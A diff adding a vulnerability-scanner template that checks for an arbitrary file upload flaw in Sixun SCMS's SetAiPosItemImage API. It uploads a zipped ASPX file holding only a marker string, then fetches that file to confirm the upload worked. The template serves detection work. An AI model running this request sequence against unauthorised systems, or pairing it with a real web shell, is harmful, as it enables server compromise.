@@ -1,0 +1,49 @@
+id: sixun-scms-setaipositemimage-anyfile-upload
+
+info:
+  name: Arbitrary File Upload in Sixun SCMS SetAiPosItemImage API
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Arbitrary file upload vulnerability in Sixun SCMS allows attackers to upload malicious files through the SetAiPosItemImage API endpoint.
+  tags: file-upload
+
+variables:
+  file_data: "UEsDBAoAAAAAANFuTFoLuC55JAAAACQAAAAJAAAAdGVzdC5hc3B4VGhlcmUgaXMgYSBmaWxlIHVwbG9hZCB2dWxuZXJhYmlsaXR5UEsBAj8ACgAAAAAA0W5MWgu4LnkkAAAAJAAAAAkAJAAAAAAAAAAgAAAAAAAAAHRlc3QuYXNweAoAIAAAAAAAAQAYAAwUeZYSfdsBAAAAAAAAAAAAAAAAAAAAAFBLBQYAAAAAAQABAFsAAABLAAAAAAA="
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/api/POS/SetAiPosItemImage"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"Body":{"pos_id":"test","file_data":"{{file_data}}","last_time":""}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "DataTransResponseDTO"
+          - "<Success>true</Success>"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/AiItemImage/test.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "There is a file upload vulnerability"
